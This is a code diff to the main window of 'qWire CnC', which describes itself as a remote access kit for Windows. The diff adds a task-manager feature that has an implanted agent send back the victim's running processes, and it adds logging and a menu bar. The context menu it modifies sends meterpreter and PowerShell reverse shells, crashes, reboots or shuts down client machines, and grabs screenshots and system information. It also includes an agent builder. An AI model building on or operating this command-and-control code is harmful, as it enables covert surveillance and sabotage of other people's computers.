@@ -10,20 +10,22 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.0
+# Build:  1.0.1
 # -------------------------------------------------------------
 from PyQt5 import QtCore, QtGui, QtWidgets
 from PyQt5.Qt import Qt
 from PyQt5.QtWidgets import QWidget,QMenu
 from PyQt5.QtCore import QEvent
 
-from ..logging.logging import LoggingUtilitys,NetworkingConfigs,ClientWindow
+from ..logging.logging import LoggingUtilitys,NetworkingConfigs,ClientWindow,ConsoleWindow
 from ..Qt5.settings_window import Ui_settings_window
 from ..Qt5.ListenerGUI import Ui_ListenerGUI
 from ..Qt5.sysinfo_window import Ui_host_info_window
 from ..Qt5.info_window import Ui_information_window
 from ..Qt5.screenshot_window import Ui_screenshot_window
 from ..Qt5.agent_builder_window import Ui_builder_dialog
+from ..Qt5.update_log_window import Ui_update_log_window
+from ..Qt5.task_manager_window import Ui_task_manager_dialog
 from ..Qt5.icons import IconObj,ImageObj,PixmapObj
 from ..utils.file_paths import BGPath
 from ..utils.file_paths import DSFilePath
@@ -44,6 +46,7 @@ listening_ports_array = []
 active_connections_array = []
 listening_sockets_array = []
 
+BUILD_VERSION = '1.0.1'
 
 #Thread for running background tasks. Qt does not run well with the pythons threading libs
 class ProcessRunnable(QtCore.QRunnable):
@@ -173,6 +176,13 @@ class Ui_main_window(QWidget):
     def update_dns_domains(self):
         DomainHandler().update_dns_domain()         #Update domain
 
+    #Function is a special function to pass client socket obj and encryption key to window
+    def open_client_compatible_window(self,UI,client_sock_obj,encryption_key):
+        self.window = QtWidgets.QDialog()
+        self.ui = UI()
+        self.ui.setupUi(self.window,client_sock_obj,encryption_key)
+        self.window.show()
+
     #Function will open new window with the ui object passed as a parameter
     def open_new_window(self,UI):
         self.window = QtWidgets.QDialog()
@@ -232,6 +242,8 @@ class Ui_main_window(QWidget):
             enumeration_menu.setIcon(IconObj().magn_glass_icon)                   #Icon
             system_info = enumeration_menu.addAction('System Info')     #System Information exfiltration
             system_info.setIcon(IconObj().system_icon)                  #Icon
+            get_client_process = enumeration_menu.addAction('Task Manager') #Task Manager
+            get_client_process.setIcon(IconObj().task_manager_icon)     #Icon
             surveillance_menu = context_menu.addMenu('Surveillance')    #Add surveillance menu
             surveillance_menu.setIcon(IconObj().surveillance_icon)      #Icon
             screenshot = surveillance_menu.addAction('Screenshot')      #Screenshot action
@@ -239,39 +251,64 @@ class Ui_main_window(QWidget):
 
             action = context_menu.exec_(self.mapToGlobal(event.globalPos()))    #Define the click action bool for the menu
             if action == python_meterpreter:                            #If python meterpreter is clicked
-                lport = NetworkingConfigs().retrieve_shell_lport()      # Get the listening port
+                lport = NetworkingConfigs().retrieve_shell_lport()  # Get the listening port
+                ConsoleWindow().log_to_console('Starting python meterpreter listener on port {lport}') #Log to console
                 Meterpreter().exec_python_meterpreter_shell(lport, get_key_from_row(),get_client_socket_obj())  #Send the shell code to the agent
             if action == powershell_shell:                              #If powershell shell is clicked
                 lport = NetworkingConfigs().retrieve_shell_lport()      #Get the listening port
+                ConsoleWindow().log_to_console(f'Starting netcat listener on {lport}') #Log to console
                 PowerShell().exec_reverse_shell(lport,get_key_from_row(),get_client_socket_obj())   #Send the shell code
             if action == reconnect_action:                              #If the reconnect action is clicked
+                ConsoleWindow().log_to_console('Reconnecting client')   #Log action to console
                 NetHandle().client_reconnect(get_key_from_row(),get_client_socket_obj())        #Tell the client to reconnect
                 ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(), get_key_from_row().decode())
                 remove_client_socket()
             if action == ping_client:                                   #If action is ping client
                 NetHandle().ping_client(get_key_from_row(),get_client_socket_obj())             #Ping the client and catch the reply
-            if action == blue_screen:
+            if action == blue_screen:                                   #If action is to blue screen the client
+                ConsoleWindow().log_to_console('Forcing system crash on client') #Log action to console
                 SystemManager().force_blue_screen(get_key_from_row(),get_client_socket_obj())   #Force agent to bluescreen computer
-            if action == reboot_client:
-                SystemManager().reboot_client_system(get_key_from_row(),get_client_socket_obj()) #Force agent to reboot computer
-                ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(),
+                ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(),    #Remove client from screen
                                                         get_key_from_row().decode())
-                remove_client_socket()
-            if action == shutdown_client:
+                remove_client_socket()                                                          #Remove the socket
+            if action == reboot_client:                                  #If action is to reboot the client
+                ConsoleWindow().log_to_console('Rebooting Client')      #Log to console
+                SystemManager().reboot_client_system(get_key_from_row(),get_client_socket_obj()) #Force agent to reboot computer
+                ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(),#Remove client from screen
+                                                        get_key_from_row().decode())
+                remove_client_socket()                                                          #Remove client socket
+            if action == shutdown_client:                                #If action is to shutdown the client
+                ConsoleWindow().log_to_console('Shutting down client computer') #Log to console
                 SystemManager().shutdown_client_system(get_key_from_row(),get_client_socket_obj())#Force agent to shutdown the computer
+                ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(),#Remove client from screen
+                                                        get_key_from_row().decode())
+                remove_client_socket()                                                          #Remove the socket
             if action == system_info:
+                ConsoleWindow().log_to_console('Retrieving client system information') #Log to console
                 SystemCommands().exfil_sys_and_ip_info(get_key_from_row(),get_client_socket_obj()) #Tell agent to run commands, open socket to receive output
                 while True:
                     if exists(DSFilePath().sys_info_file):      #When the output is received, a file is made in data_storage. if the file exists
                         break                                   #Break the loop
+                ConsoleWindow().log_to_console('Received output from client') #Log to console
                 self.open_new_window(Ui_host_info_window)       #Open window with the command output. Window will populate data from file.
             if action == screenshot:
+                ConsoleWindow().log_to_console('Capturing screenshot from client') #Log to console
                 Streaming().get_client_screenshot(get_key_from_row(),get_client_socket_obj())   #Get screenshot
                 self.open_new_window(Ui_screenshot_window)              #Open window with photo
+                ConsoleWindow().log_to_console('Received screenshot')   #Log to console
             if action == disconnect_action:                             #If action is to disconnect client
+                ConsoleWindow().log_to_console('Disconnecting client')  #Log to console
                 NetHandle().disconnect_client(get_key_from_row(),get_client_socket_obj())       #Disconnect the client
                 ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(),get_key_from_row().decode()) #Remove the connection from the array
-                remove_client_socket() #Remove the socket
+                remove_client_socket()                                  #Remove the socket
+            if action == get_client_process:                            #If the action is to get the client process
+                ConsoleWindow().log_to_console('Starting task manager') #Log to console
+                SystemCommands().extract_running_process(get_key_from_row(),get_client_socket_obj()) #Instruct agent to exfiltrate client process's
+                while True:                                             #Start while loop
+                    if exists(DSFilePath().task_manager_file):          #When the task manager data has arrived
+                        sleep(1)                                        #Hold the main thread for 1 second
+                        break                                           #Break the loop
+                self.open_client_compatible_window(Ui_task_manager_dialog,get_client_socket_obj(),get_key_from_row())   #Open the task manager window
             return True
         return super().eventFilter(source, event)
 
@@ -287,6 +324,7 @@ class Ui_main_window(QWidget):
         self.active_connections_list.setSizePolicy(QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Expanding)
         self.active_connections_list.setAutoFillBackground(True)
         self.active_connections_list.setObjectName("active_connections_list")
+        self.active_connections_list.horizontalHeader().setStretchLastSection(True)
         self.active_connections_list.verticalHeader().setVisible(False)         #Hide The row numbers from the connections list
         self.active_connections_list.setColumnCount(9)
         self.active_connections_list.setRowCount(0)
@@ -316,31 +354,62 @@ class Ui_main_window(QWidget):
         self.implant_callback_window.setGeometry(QtCore.QRect(1030, 390, 551, 251))
         self.implant_callback_window.setStyleSheet("")
         self.implant_callback_window.setObjectName("implant_callback_window")
-        self.builder_button = QtWidgets.QPushButton(self.centralwidget,clicked=lambda: self.open_new_window(Ui_builder_dialog))
-        self.builder_button.setGeometry(QtCore.QRect(10, 620, 141, 31))
-        self.builder_button.setObjectName('builder_button')
-        self.builder_button.setIcon(IconObj().builder_icon)
+        ##############################
+        # Left hidden sync button in there for now as it is not causing any issues and makes the program work as intended
+        ##############################
         self.sync_button = QtWidgets.QPushButton(self.centralwidget, clicked=lambda: self.start_refresh_ui_thread())
         self.sync_button.setGeometry(QtCore.QRect(10, 620, 141, 31))
         self.sync_button.setObjectName("pushButton_2")
-        self.info_button = QtWidgets.QPushButton(self.centralwidget,clicked=lambda: self.open_new_window(Ui_information_window))
-        self.info_button.setGeometry(QtCore.QRect(10, 650, 141, 31))
-        self.info_button.setIcon(IconObj().info_icon)
-        self.info_button.setObjectName("info_button")
-        self.settings_button = QtWidgets.QPushButton(self.centralwidget, clicked=lambda: self.open_new_window(Ui_settings_window))
-        self.settings_button.setGeometry(QtCore.QRect(10, 680, 141, 31))
-        self.settings_button.setIcon(IconObj().settings_icon)
-        self.settings_button.setObjectName("settings_button")
-        self.update_dns_button = QtWidgets.QPushButton(self.centralwidget,clicked=lambda: self.update_dns_domains())
-        self.update_dns_button.setGeometry(QtCore.QRect(10, 710, 141, 31))
-        self.update_dns_button.setIcon(IconObj().duck_dns_icon)
-        self.update_dns_button.setIconSize(QtCore.QSize(18, 18))
-        self.update_dns_button.setObjectName("update_dns_button")
-        self.create_listener_button = QtWidgets.QPushButton(self.centralwidget, clicked=lambda: self.open_new_window(Ui_ListenerGUI))
-        self.create_listener_button.setGeometry(QtCore.QRect(10, 740, 141, 31))
-        self.create_listener_button.setIcon(IconObj().satellite_icon)
-        self.create_listener_button.setIconSize(QtCore.QSize(18, 18))
-        self.create_listener_button.setObjectName("create_listener_button")
+        ######################################################
+        # Begin Menu Bar section for top of main gui         #
+        ######################################################
+        self.main_menu_bar = QtWidgets.QMenuBar(main_window)
+        self.main_menu_bar.setGeometry(QtCore.QRect(0, 0, 1575, 24))
+        self.main_menu_bar.setObjectName("main_menu_bar")
+        self.network_menu = QtWidgets.QMenu(self.main_menu_bar)
+        self.network_menu.setObjectName('network_menu')
+        self.network_menu.setIcon(IconObj().net_icon)
+        self.about_menu = QtWidgets.QMenu(self.main_menu_bar)
+        self.about_menu.setObjectName('about_menu')
+        self.about_menu.setIcon(IconObj().info_icon)
+        self.builder_menu = QtWidgets.QMenu(self.main_menu_bar)
+        self.builder_menu.setObjectName("builder_menu")
+        self.builder_menu.setIcon(IconObj().builder_icon)
+        self.settings_menu = QtWidgets.QMenu(self.main_menu_bar)
+        self.settings_menu.setObjectName("settings_menu")
+        self.settings_menu.setIcon(IconObj().settings_icon)
+        main_window.setMenuBar(self.main_menu_bar)
+        self.open_listener_window = QtWidgets.QAction(main_window,triggered=lambda: self.open_new_window(Ui_ListenerGUI))
+        self.open_listener_window.setObjectName("open_listener_window")
+        self.open_listener_window.setIcon(IconObj().satellite_icon)
+        self.update_dns = QtWidgets.QAction(main_window,triggered=lambda: self.update_dns_domains())
+        self.update_dns.setObjectName("update_dns")
+        self.update_dns.setIcon(IconObj().duck_dns_icon)
+        self.version_info = QtWidgets.QAction(main_window,triggered=lambda: self.open_new_window(Ui_information_window))
+        self.version_info.setObjectName("version_info")
+        self.version_info.setIcon(IconObj().info_icon)
+        self.update_logs = QtWidgets.QAction(main_window,triggered=lambda: self.open_new_window(Ui_update_log_window))
+        self.update_logs.setObjectName("update_logs")
+        self.update_logs.setIcon(IconObj().update_log_icon)
+        self.agent_builder = QtWidgets.QAction(main_window,triggered=lambda: self.open_new_window(Ui_builder_dialog))
+        self.agent_builder.setObjectName("agent_builder")
+        self.agent_builder.setIcon(IconObj().builder_icon)
+        self.qwire_settings = QtWidgets.QAction(main_window,triggered=lambda: self.open_new_window(Ui_settings_window))
+        self.qwire_settings.setObjectName("qwire_settings")
+        self.qwire_settings.setIcon(IconObj().settings_icon)
+        self.network_menu.addAction(self.open_listener_window)
+        self.network_menu.addAction(self.update_dns)
+        self.about_menu.addAction(self.version_info)
+        self.about_menu.addAction(self.update_logs)
+        self.builder_menu.addAction(self.agent_builder)
+        self.settings_menu.addAction(self.qwire_settings)
+        self.main_menu_bar.addAction(self.network_menu.menuAction())
+        self.main_menu_bar.addAction(self.builder_menu.menuAction())
+        self.main_menu_bar.addAction(self.settings_menu.menuAction())
+        self.main_menu_bar.addAction(self.about_menu.menuAction())
+        #########################################################
+        #                END MENU BAR                           #
+        #########################################################
         self.status_window = QtWidgets.QLabel(self.centralwidget)
         self.status_window.setGeometry(QtCore.QRect(20, 370, 731, 221))
         self.status_window.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
@@ -407,7 +476,7 @@ class Ui_main_window(QWidget):
 
     def retranslateUi(self, main_window):
         _translate = QtCore.QCoreApplication.translate
-        main_window.setWindowTitle(_translate("main_window", "qWire CnC"))
+        main_window.setWindowTitle(_translate("main_window", f"qWire CnC Build: {BUILD_VERSION}"))
         item = self.active_connections_list.horizontalHeaderItem(0)
         item.setText(_translate("main_window", "Public IP:Port"))
         item = self.active_connections_list.horizontalHeaderItem(1)
@@ -426,24 +495,15 @@ class Ui_main_window(QWidget):
         item.setText(_translate("main_window", "Privelege"))
         item = self.active_connections_list.horizontalHeaderItem(8)
         item.setText(_translate("main_window", "Encryption Key"))
-        self.builder_button.setText(_translate("main_window","Builder"))
-        self.sync_button.setText(_translate("main_window", "Sync"))
-        self.info_button.setText(_translate("main_window", "Info"))
-        self.settings_button.setText(_translate("main_window", "Settings"))
-        self.update_dns_button.setText(_translate("main_window", "Update DNS"))
-        self.create_listener_button.setText(_translate("main_window", "Listeners"))
+        self.open_listener_window.setText(_translate("main_window", "Listenters"))
+        self.update_dns.setText(_translate("main_window", "Update DNS"))
+        self.version_info.setText(_translate("main_window", "Version Info"))
+        self.update_logs.setText(_translate("main_window", "Update Log"))
+        self.agent_builder.setText(_translate("main_window", "Agent Builder"))
+        self.qwire_settings.setText(_translate("main_window", "qWire Settings"))
         self.connections_label.setText(_translate("main_window", "Connections: 0"))
         self.data_label.setText(_translate("main_window", "Data tx/rx: 0\\b"))
         self.interface_label.setText(_translate("main_window", "Network Interface: "))
         self.active_sockets_label.setText(_translate("main_window", "Active Sockets"))
         self.sync_button.click() #Automatically start ui refresh thread at program launch
         self.sync_button.hide()  #Hide the sync button
-
-if __name__ == "__main__":
-    import sys
-    app = QtWidgets.QApplication(sys.argv)
-    main_window = QtWidgets.QMainWindow()
-    ui = Ui_main_window()
-    ui.setupUi(main_window)
-    main_window.show()
-    sys.exit(app.exec_())
